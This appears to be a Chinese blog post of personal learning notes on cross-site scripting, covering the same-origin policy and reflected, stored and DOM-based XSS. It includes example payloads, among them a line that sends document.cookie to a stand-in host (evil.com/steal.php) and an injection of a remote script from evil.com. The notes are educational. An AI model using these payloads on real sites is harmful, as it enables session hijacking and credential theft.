<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  <title>Web学习笔记 之 XSS | Van1sh的小屋</title>
  <meta name="keywords" content=" Web , XSS ">
  <meta name="description" content="Web学习笔记 之 XSS | Van1sh的小屋">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="It is not ignorance and weakness but arrogance that destroys mankind">
<meta property="og:type" content="website">
<meta property="og:title" content="Van1sh的小屋">
<meta property="og:url" content="http://jayxv.github.io/categories/index.html">
<meta property="og:site_name" content="Van1sh的小屋">
<meta property="og:description" content="It is not ignorance and weakness but arrogance that destroys mankind">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2019-07-14T08:00:41.247Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Van1sh的小屋">
<meta name="twitter:description" content="It is not ignorance and weakness but arrogance that destroys mankind">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.0.1" rel="stylesheet">

<link href="/css/hl_theme/sublime.css?v=1.0.1" rel="stylesheet">

<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="/js/jquery.autocomplete.min.js?v=1.0.1"></script>

<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>



<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>

<script src="/js/iconfont.js?v=1.0.1"></script>

</head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="false">
  <input class="theme_blog_path" value>
</div>

<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/" class="avatar_target">
    <img class="avatar" src="/img/avatar.jpg" />
</a>
<div class="author">
    <span>Van1sh</span>
</div>

<div class="icon">
    
        
    
        
        <a title="github" href="https://github.com/JayxV" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-github"></use>
                </svg>
            
        </a>
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
        <a title="email" href="mailto:643713081@qq.com" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-email"></use>
                </svg>
            
        </a>
        
    
        
        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=643713081&site=qq&menu=yes" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-qq"></use>
                </svg>
            
        </a>
        
    
        
    
        
    
</div>




<ul>
    <li><div class="all active">全部文章<small>(28)</small></div></li>
    
        
            
            <li><div data-rel="比赛小屋">比赛小屋<small>(10)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="工具小屋">工具小屋<small>(5)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="密码小屋"><i class="fold iconfont icon-right"></i>密码小屋<small>(10)</small></div>
                
                    <ul class="sub hide">
                        
                        <li><div data-rel="Paillier">Paillier<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="ECC">ECC<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Lattice">Lattice<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Stream">Stream<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Rsa">Rsa<small>(2)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Basic">Basic<small>(2)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="Block">Block<small>(1)</small></div>
                            
                        </li>
                            
                        <li><div data-rel="RSA">RSA<small>(1)</small></div>
                            
                        </li>
                            
                    </ul>
                
            </li>
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
            <li><div data-rel="Web小屋">Web小屋<small>(1)</small></div>
                
            </li>
            
        
    
        
            
        
    
        
            
            <li><div data-rel="小书屋">小书屋<small>(1)</small></div>
                
            </li>
            
        
    
</ul>
<div class="left-bottom">
    <div class="menus">
    
    
    
    
    </div>
    <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="28">
<input type="hidden" id="yelog_site_word_count" value="118.5k">
<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        友情链接
        <i class="back-title-list"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="http://www.fzwjscj.xyz/">fzwjscj</a></li>
            
            <li><a target="_blank" href="http://dldxz.cn/">DLDXZ</a></li>
            
            <li><a target="_blank" href="http://fanda.cloud/">fanda</a></li>
            
            <li><a target="_blank" href="http://passingfoam.com/">PassingFoam&#39;s blog</a></li>
            
            <li><a target="_blank" href="https://eqqie.cn/">赤道企鹅</a></li>
            
            <li><a target="_blank" href="http://blog.ragdoll.work/">咲夜南梦</a></li>
            
            <li><a target="_blank" href="https://www.zhaoj.in/">glzjin</a></li>
            
            <li><a target="_blank" href="https://coinc1dens.github.io/">Coinc1dens</a></li>
            
            <li><a target="_blank" href="http://blog.soreatu.com/">soreatu</a></li>
            
            <li><a target="_blank" href="http://www.ga1axy.top/">盖乐希</a></li>
            
            <li><a target="_blank" href="https://shawroot.cc/">Root.</a></li>
            
            <li><a target="_blank" href="https://l1near.top/">l1near</a></li>
            
            <li><a target="_blank" href="https://0xdktb.top/">0xDktb</a></li>
            
            <li><a target="_blank" href="https://www.wootec.top/">Reverier</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <form onkeydown="if(event.keyCode === 13){return false;}">
        <input id="local-search-input" class="search" type="text" placeholder="以 in: 开头进行全文搜索" />
        <i class="cross"></i>
        <span>
            <label for="tagswitch">Tags:</label>
            <input id="tagswitch" type="checkbox" style="display: none" />
            <i id="tagsWitchIcon"></i>
        </span>
    </form>
    <div class="tags-list">
    
    <li class="article-tag-list-item">
        <a class="color4">Write Up</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">docker</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">Sage</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">Paillier</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">ECC</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">Lattice</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">Dsa</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">LCG</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">Rc4</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">SM4</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">Rsa</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">Book</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">python</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">操作模式</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">number theory</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">Abstract algebra</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">Web</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">XSS</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">Nmap</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">Linux</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">book</a>
    </li>
    
    <div class="clearfix"></div>
</div>

    
    <div id="local-search-result">

    </div>
    
    <nav id="title-list-nav">
        
        <a id="top" class=""
           href="/2020/05/03/待办事项/"
           data-tag=""
           data-author="Van1sh" >
            <span class="post-title" title="Van1sh 的 待办事项">Van1sh 的 待办事项</span>
            <span class="post-date" title="2020-05-03 13:18:35">2020/05/03</span>
        </a>
        
        <a id="top" class="密码小屋 Basic "
           href="/2020/05/27/密码学学习笔记之 introduction to mathematical cryptography/"
           data-tag="Book"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 introduction to mathematical cryptography">密码学学习笔记 之 introduction to mathematical cryptography</span>
            <span class="post-date" title="2020-05-27 21:05:00">2020/05/27</span>
        </a>
        
        <a  class="Web小屋 "
           href="/2020/07/26/Web学习笔记 之 XSS/"
           data-tag="Web,XSS"
           data-author="Van1sh" >
            <span class="post-title" title="Web学习笔记 之 XSS">Web学习笔记 之 XSS</span>
            <span class="post-date" title="2020-07-26 10:44:00">2020/07/26</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/05/26/2020BJD3rd/"
           data-tag="Write Up"
           data-author="Van1sh &amp; FzWjScJ" >
            <span class="post-title" title="2020 BJD3rd">2020 BJD3rd</span>
            <span class="post-date" title="2020-05-26 16:00:47">2020/05/26</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/05/24/2020GKCTF/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2020 GKCTF">2020 GKCTF</span>
            <span class="post-date" title="2020-05-24 17:05:00">2020/05/24</span>
        </a>
        
        <a  class="密码小屋 RSA "
           href="/2020/05/20/密码学学习笔记之RSA/"
           data-tag="Rsa"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 RSA">密码学学习笔记 之 RSA</span>
            <span class="post-date" title="2020-05-20 20:40:00">2020/05/20</span>
        </a>
        
        <a  class="工具小屋 "
           href="/2020/05/20/sage常用命令/"
           data-tag="Sage"
           data-author="Van1sh" >
            <span class="post-title" title="sage常用命令">sage常用命令</span>
            <span class="post-date" title="2020-05-20 11:22:00">2020/05/20</span>
        </a>
        
        <a  class="密码小屋 Paillier "
           href="/2020/05/14/密码学学习笔记之 paillier cryptosystem/"
           data-tag="Paillier"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 paillier cryptosystem">密码学学习笔记 之 paillier cryptosystem</span>
            <span class="post-date" title="2020-05-14 11:00:19">2020/05/14</span>
        </a>
        
        <a  class="密码小屋 Lattice "
           href="/2020/05/12/密码学学习笔记之HNP/"
           data-tag="Lattice,Dsa,LCG"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 HNP">密码学学习笔记 之 HNP</span>
            <span class="post-date" title="2020-05-12 10:00:57">2020/05/12</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/05/10/2020网鼎杯/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2020 网鼎杯">2020 网鼎杯</span>
            <span class="post-date" title="2020-05-10 21:15:00">2020/05/10</span>
        </a>
        
        <a  class="密码小屋 ECC "
           href="/2020/05/07/密码学学习笔记之NCCIP/"
           data-tag="ECC"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 NCCIP">密码学学习笔记 之 NCCIP</span>
            <span class="post-date" title="2020-05-07 10:30:43">2020/05/07</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/05/05/2020De1CTF/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2020 De1CTF">2020 De1CTF</span>
            <span class="post-date" title="2020-05-05 15:57:00">2020/05/05</span>
        </a>
        
        <a  class="密码小屋 Block "
           href="/2020/03/03/密码学学习笔记之分组密码操作模式/"
           data-tag="操作模式"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 分组密码操作模式">密码学学习笔记 之 分组密码操作模式</span>
            <span class="post-date" title="2020-03-03 15:15:00">2020/03/03</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/02/18/2020hgame_week1/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2020 hgame week1">2020 hgame week1</span>
            <span class="post-date" title="2020-02-18 16:22:35">2020/02/18</span>
        </a>
        
        <a  class="密码小屋 Stream "
           href="/2020/01/30/密码学学习笔记之RC4与SM4/"
           data-tag="Rc4,SM4"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 RC4与SM4">密码学学习笔记 之 RC4与SM4</span>
            <span class="post-date" title="2020-01-30 00:05:00">2020/01/30</span>
        </a>
        
        <a  class="密码小屋 Rsa "
           href="/2019/12/04/密码学学习笔记之浅析On r-th Root Extraction Algorithm in Fq/"
           data-tag="Rsa"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 浅析On r-th Root Extraction Algorithm in Fq">密码学学习笔记 之 浅析On r-th Root Extraction Algorithm in Fq</span>
            <span class="post-date" title="2019-12-04 14:30:46">2019/12/04</span>
        </a>
        
        <a  class="密码小屋 Basic "
           href="/2019/12/03/密码学学习笔记之数论四大定理及应用/"
           data-tag="number theory,Abstract algebra"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 数论四大定理及应用">密码学学习笔记 之 数论四大定理及应用</span>
            <span class="post-date" title="2019-12-03 15:30:25">2019/12/03</span>
        </a>
        
        <a  class="密码小屋 Rsa "
           href="/2019/11/11/密码学学习笔记之浅析Pollard's rho algorithm及其应用/"
           data-tag="Rsa"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 浅析Pollard&#39;s rho algorithm及其应用">密码学学习笔记 之 浅析Pollard&#39;s rho algorithm及其应用</span>
            <span class="post-date" title="2019-11-11 15:32:00">2019/11/11</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/11/08/2019UNCTF/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2019 UNCTF">2019 UNCTF</span>
            <span class="post-date" title="2019-11-08 11:30:30">2019/11/08</span>
        </a>
        
        <a  class="工具小屋 "
           href="/2019/11/01/docker和docker-compose的安装/"
           data-tag="docker"
           data-author="Van1sh" >
            <span class="post-title" title="安装Docker 和 Docker-Compose以及docker images的制作及上传">安装Docker 和 Docker-Compose以及docker images的制作及上传</span>
            <span class="post-date" title="2019-11-01 21:00:00">2019/11/01</span>
        </a>
        
        <a  class="工具小屋 "
           href="/2019/09/12/Linux 基础/"
           data-tag="Linux"
           data-author="Vanish" >
            <span class="post-title" title="Linux 基础">Linux 基础</span>
            <span class="post-date" title="2019-09-12 00:17:00">2019/09/12</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/08/29/2019第五空间/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2019 第五空间">2019 第五空间</span>
            <span class="post-date" title="2019-08-29 12:18:35">2019/08/29</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/08/27/2019OGeek/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2019 OGeek">2019 OGeek</span>
            <span class="post-date" title="2019-08-27 11:02:35">2019/08/27</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/08/03/2019De1CTF/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2019 De1CTF">2019 De1CTF</span>
            <span class="post-date" title="2019-08-03 22:14:55">2019/08/03</span>
        </a>
        
        <a  class="小书屋 "
           href="/2019/08/02/三体/"
           data-tag="book"
           data-author="Van1sh" >
            <span class="post-title" title="三体">三体</span>
            <span class="post-date" title="2019-08-02 12:56:00">2019/08/02</span>
        </a>
        
        <a  class="工具小屋 "
           href="/2019/07/22/nmap/"
           data-tag="Nmap"
           data-author="Van1sh" >
            <span class="post-title" title="初遇Nmap">初遇Nmap</span>
            <span class="post-date" title="2019-07-22 16:07:55">2019/07/22</span>
        </a>
        
        <a  class="工具小屋 "
           href="/2019/07/21/python 正则/"
           data-tag="python"
           data-author="Van1sh" >
            <span class="post-title" title="python 之 正则">python 之 正则</span>
            <span class="post-date" title="2019-07-21 22:30:35">2019/07/21</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/07/15/2019赛博杯/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2019 赛博杯">2019 赛博杯</span>
            <span class="post-date" title="2019-07-15 16:22:35">2019/07/15</span>
        </a>
        
    </nav>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div class="post">
    <div class="pjax">
        <article id="post-Web学习笔记 之 XSS" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">Web学习笔记 之 XSS</h1>
    
    <div class="article-meta">
        
        
        <span class="author"><a>Van1sh</a></span>
        
        
        <span class="book">
            
                <a  data-rel="Web小屋">Web小屋</a>
            
        </span>
        
        
        <span class="tag">
            
            <a class="color4">Web</a>
            
            <a class="color4">XSS</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
        创建时间:<time class="date" title='更新时间: 2020-07-26 11:33:15'>2020-07-26 10:44</time>
        
    </div>
    <div class="article-meta">
        
        <span>字数:7.8k</span>
        
        
        <span id="busuanzi_container_page_pv">
            阅读:<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#指令、数据"><span class="toc-text">指令、数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#同源策略"><span class="toc-text">同源策略</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL"><span class="toc-text">URL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#反射型-XSS"><span class="toc-text">反射型 XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储型-XSS"><span class="toc-text">存储型 XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM型-XSS"><span class="toc-text">DOM型 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#实例"><span class="toc-text">实例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#场景-HTML"><span class="toc-text">场景(HTML)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-HTML标签之间"><span class="toc-text">1. HTML标签之间</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-HTML标签之内"><span class="toc-text">2. HTML标签之内</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM渲染"><span class="toc-text">DOM渲染</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML与JavaScript自解码机制"><span class="toc-text">HTML与JavaScript自解码机制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS过滤与绕过"><span class="toc-text">XSS过滤与绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#空格、回车和tab"><span class="toc-text">空格、回车和tab</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#对标签属性值进行转码"><span class="toc-text">对标签属性值进行转码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用CSS绕过"><span class="toc-text">使用CSS绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#扰乱规则"><span class="toc-text">扰乱规则</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用字符编码"><span class="toc-text">利用字符编码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#parseInt-与toString"><span class="toc-text">parseInt()与toString()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#其它技巧"><span class="toc-text">其它技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#setTimeout-amp-setInterval"><span class="toc-text">setTimeout&amp;setInterval</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#结合函数："><span class="toc-text">结合函数：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#constructor-NaN"><span class="toc-text">constructor</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#防御"><span class="toc-text">防御</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#输入"><span class="toc-text">输入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#输出"><span class="toc-text">输出</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#其他"><span class="toc-text">其他</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一些BAT的XSS实例（修改而来的XSS题目）"><span class="toc-text">一些BAT的XSS实例（修改而来的XSS题目）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#第一关"><span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第二关"><span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第三关"><span class="toc-text">第三关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第四关"><span class="toc-text">第四关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第五关"><span class="toc-text">第五关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第六关"><span class="toc-text">第六关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第七关"><span class="toc-text">第七关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第八关"><span class="toc-text">第八关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第九关"><span class="toc-text">第九关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第十关"><span class="toc-text">第十关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结-1"><span class="toc-text">总结</span></a></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="指令、数据"><a href="#指令、数据" class="headerlink" title="指令、数据"></a>指令、数据</h2><p>&emsp;&emsp;Web世界是由数据构成的，而存储、传输、展示出这些数据则需要指令的执行。合适的指令在合适的环境下解释执行，从而产生合适的数据内容。比如<code>select username,email from user where id = 1;</code>,这是一条SQL查询指令，当这条指令被数据库引擎解释执行时就会产生一组数据，内容由username、email构成。再如<code>&lt;script&gt;eval(location.hash.substr(1));&lt;/script&gt;</code> <code>&lt;script&gt;&lt;/script&gt;</code>标签内是一句JavaScript指令，由浏览器的JS引擎来解释执行，解释的结果就是数据。而它本身则是一个HTML标签，由浏览器的DOM引擎渲染执行。</p>
<p>&emsp;&emsp;如果指令和数据完全独立，那显然是太平盛世，然而如果正常的输入数据被注入了指令，并且在解释的过程中指令还被独立执行了，那么攻击就发生了。</p>
<p>&emsp;&emsp;如果<a href="http://www.evil.com/info.html的代码内容为`" target="_blank" rel="noopener">www.evil.com/info.html的代码内容为`</a><script>eval(location.hash.substr(1));</script>`</p>
<p>&emsp;&emsp;我们构造如下链接<code>http://www.evil.com/info.html#new%20Image().src=&quot;http://www.evil.com/steal.php?c=&quot;+escape(document.cookie)</code></p>
<p>&emsp;&emsp;那么浏览器就会解释执行<code>eval(locaion.hash.substr(1));</code>变为<code>eval(&#39;new Image().src=&quot;http://www.evil.com/steal.php?c=&quot;+escape(document.cookie)&#39;)</code>  </p>
<p>&emsp;&emsp;当被攻击者被诱骗点了该链接时，Cookies会话信息就会被传到黑客网站上。</p>
<p>&emsp;&emsp;攻击的发生，是因为通过url注入了一段恶意的指令，并且该指令能被执行。</p>
<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>&emsp;&emsp;同源策略有几个关键词：不同域、客户端脚本、授权、读写、资源。</p>
<p>&emsp;&emsp;同域要求两个站点同协议、同域名、同端口。</p>
<p>&emsp;&emsp;授权：HTML5新标准中提到关于AJAX跨域访问默认情况下是不允许的，只有目标站点明确的返回HTTP响应头：<code>Access-Control-Allow-Origin: http://www.evil.com</code></p>
<p>&emsp;&emsp;资源：包括HTTP消息头、整个DOM树、浏览器存储等</p>
<p>&emsp;&emsp;DOM：全称Document Object Model，即文档对象模型，就是浏览器将HTML/XML这样的文档抽象成一个树形结构，树上的每一个节点都代表HTML/XML中的标签、标签属性或标签内容。</p>
<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>&emsp;&emsp;url有个重点就是编码方式，有三类：escape、encodeURI、encodeURIComponent,对应的解码函数是：unescape、decodeURI、decodeURIComponent。</p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>&emsp;&emsp;XSS全称为跨站脚本(Cross Site Scripting)。跨站点脚本（XSS）攻击是一种注射型攻击，攻击者在可信的网页中嵌入恶意代码，用户访问可信网页时触发XSS而被攻击。</p>
<p>&emsp;&emsp;很多时候输入的内容长度是有限制的。真正的XSS弹窗毫无意义，所以攻击代码可能会比较长，一般注入类似的下面的引用第三方域上的脚本<code>&lt;script&gt;src=&quot;http://www.evil.com/xss.js&quot;&gt;&lt;/script&gt;</code></p>
<h3 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h3><p>&emsp;&emsp;发出请求时，XSS代码出现在URL中，作为输入提交到服务器，服务端解析后响应，在响应内容中出现这段XSS代码，最后浏览器解析执行。这个过程就像是一次反射，故称为反射型XSS。</p>
<p>&emsp;&emsp;一个简单的例子，在<a href="http://www.foo.com/xss/reflect1.php代码如下`" target="_blank" rel="noopener">http://www.foo.com/xss/reflect1.php代码如下`</a><?php echo $_GET['x'] ?><code>，输入的x的值未经任何过滤就直接输出，可以提交：</code><a href="http://www.foo.com/xss/reflect1.php?x=" target="_blank" rel="noopener">http://www.foo.com/xss/reflect1.php?x=</a><script>alert(/Hello,/)</script><code>，服务端解析时，echo就会完整地输出</code><script>alert(/you are hacked by V, haha!/)</script>`到响应体中，然后浏览器解析执行触发。【彩蛋哈哈】</p>
<h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>&emsp;&emsp;存储型XSS和反射型XSS的差别仅在于；提交的XSS代码会存储在服务端，下次请求目标页面时不用再提交XSS代码，最典型的例子是留言板XSS。</p>
<p>&emsp;&emsp;除了留言板，如果服务端有一些记录ip的的功能甚至可以用X-Forwarded-For打XSS，见<a href="https://xz.aliyun.com/t/7887" target="_blank" rel="noopener">信呼OA存储型XSS 0day复现</a></p>
<h3 id="DOM型-XSS"><a href="#DOM型-XSS" class="headerlink" title="DOM型 XSS"></a>DOM型 XSS</h3><p>&emsp;&emsp;DOM型 XSS与反射型、存储型的差别在于，DOM型 XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事。</p>
<p>&emsp;&emsp;<a href="https://www.zhihu.com/question/26628342/answer/33504799" target="_blank" rel="noopener">知乎</a>上也有一种说法：DOM型XSS取决于输出位置，并不取决于输出环境，简单去理解就是因为他输出点在DOM，所以在道哥的《白帽子讲Web安全里》也有详细介绍。DOM型XSS是通过url传入参数去控制触发的。</p>
<p>&emsp;&emsp;然后问了一些Web师傅，他们的回答是，把DOM型XSS看作是反射型XSS的一种，是在前端实现的。所以DOM型和反射型XSS都只能自己日自己，都是需要与人交互才能产生效果。</p>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>来源：<a href="https://xz.aliyun.com/t/3919" target="_blank" rel="noopener">记一次从DOM型XSS到RCE过程</a></p>
<p>打开主页会调用index.js文件</p>
<p><img src="https://i.loli.net/2020/07/16/xSPd7bw4BTWqUOC.png" alt="img"></p>
<p>可以看到代码会用getParam函数接受提交过来的platform参数，处理后直接传给eval</p>
<p>再跟进getParam函数</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用正则表达式获取地址栏参数</span></span><br><span class="line">function getParam(paramName) &#123;</span><br><span class="line">    paramValue = <span class="string">""</span>, isFound = !<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.location.search.indexOf(<span class="string">"?"</span>) == <span class="number">0</span> &amp;&amp; <span class="keyword">this</span>.location.search.indexOf(<span class="string">"="</span>) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        arrSource = unescape(<span class="keyword">this</span>.location.search).substring(<span class="number">1</span>, <span class="keyword">this</span>.location.search.length).split(<span class="string">"&amp;"</span>), i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; arrSource.length &amp;&amp; !isFound) arrSource[i].indexOf(<span class="string">"="</span>) &gt; <span class="number">0</span> &amp;&amp; arrSource[i].split(<span class="string">"="</span>)[<span class="number">0</span>].toLowerCase() == paramName.toLowerCase() &amp;&amp; (paramValue = arrSource[i].split(<span class="string">"="</span>)[<span class="number">1</span>], isFound = !<span class="number">0</span>), i++</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> paramValue == <span class="string">""</span> &amp;&amp; (paramValue = <span class="literal">null</span>), paramValue</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

